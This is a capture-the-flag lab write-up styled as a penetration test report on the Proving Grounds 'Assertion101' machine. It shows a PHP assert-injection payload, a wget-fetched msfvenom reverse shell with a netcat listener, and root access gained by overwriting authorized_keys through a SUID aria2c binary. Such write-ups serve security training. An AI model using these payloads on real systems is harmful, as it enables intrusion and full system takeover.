# Penetration Test Report for Proving Grounds - Assertion101
- **Author:** Joey Melo
- **Date:** March 25, 2022
- **Client:** Proving Grounds
- **Host:** 192.168.54.94 (Assertion101)

## Disclaimer
The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized networks is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.

## Introduction
This penetration test report contains all efforts that were conducted in order to assess the security of Proving Grounds. This report contains all items that were used to penetrate and gain privileged access to the remote host(s). The purpose of this report is to showcase that the tester has a full understanding of penetration testing methodologies as well as the technical knowledge to perform professional cybersecurity assessments.

## Objectives
The objective of this assessment is to perform an internal penetration test against the Assertion101 network. The tester is tasked with following a methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how one would start from beginning to end, including the overall report.

## Executive Summary
The tester was tasked with performing an internal penetration test towards the Assertion101 network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks similar to those of a hacker and attempt to infiltrate Proving Grounds's internal lab systems. The tester's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Proving Grounds.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the Assertion101 network. When performing the attacks, the tester was able to gain access to the machine, primarily due to misconfiguration in the index.php file served by the HTTP host which granted the tester remote code execution in the host. The host has been successfully exploited, and privileged access was gained in the machine.

## Recommendations
The tester recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and, once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Assessment
## Service Enumeration
### Port Scan Results
- **TCP:** 22,80
## Initial Access
### Vulnerability Explanation
The remote HTTP server has a misconfigured index.php file which allows an attacker to obtain remote code execution in the system.
### Vulnerability Fix
Sanitize user input, especially in the "assert" function.
### Attack Walkthrough
While enumerating the web page, the tester noticed a "page" paramater in the index.php file served by the HTTP server.

![HTTP index.php page using "page" as parameter](https://imgur.com/cKc55C7.png)

The tester attempted to request the "/etc/passwd" file from the host; however, the host had a filter in place which blocked the usage of ".." (two dots).

![LFI blocked due to filtering in place](https://imgur.com/4XTc62A.png)

Nevertheless, the filter did not block attempts to bypass the assert function, and the tester obtained remote code execution with the following payload in the page parameter:
`' and die(system("id")) or '` 

![Filter bypassed and RCE obtained](https://imgur.com/zS6IGIF.png)

As proof of exploitation, the tester captured the *local.txt* flag.

![User flag](https://imgur.com/09hqpv0.png)

## Privilege Escalation
### Vulnerability Explanation
The remote host is running the "aria2c" binary with setuid privileges. This can be abused to write files in the system with root privileges.
### Vulnerability Fix
Remote the SUID bit from "aria2c".
### Attack Walkthrough
After establishing a foothold on the target, the tester noticed the "aria2c" binary had the SUID bit set.

![aria2c binary with SUID bit set](https://imgur.com/Vbiyq7f.png)

The tester exploited this vulnerability by uploading a known ssh key into the root folder.
```bash
aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.49.54/id_rsa.pub" --allow-overwrite=true
```

## Post-Exploitation
As proof of post-exploitation, the tester captured the *proof.txt* flag.

![Root flag](https://imgur.com/F3A4M90.png)

# Appendix A: Commands Issued
```bash
# Enumeration
sudo nmap -sC -sV -oN tcp_ports.nmap -p- 192.168.54.94

# Exploit
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f elf -o revshell.elf
python3 -m http.server 80
nc -lvnp 1337
## In browser
http://192.168.54.94/index.php?page=' and die(system("wget http://192.168.49.54/revshell.elf -O /tmp/revshell; chmod 777 /tmp/revshell; /tmp/revshell")) or '

# Initial Access
cd ..
cat local.txt
ifconfig

# Privilege Escalation
## In Assertion
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null > suids.txt
cat suids.txt # notice aria2c with suid
## In Kali
cd /home/kali/.ssh
python3 -m http.server 80
## In Assertion
aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.49.54/id_rsa.pub" --allow-overwrite=true
## In Kali
ssh -i id_rsa root@192.168.54.94

# Post Exploitation
cd /root
cat proof.txt
ifconfig
```
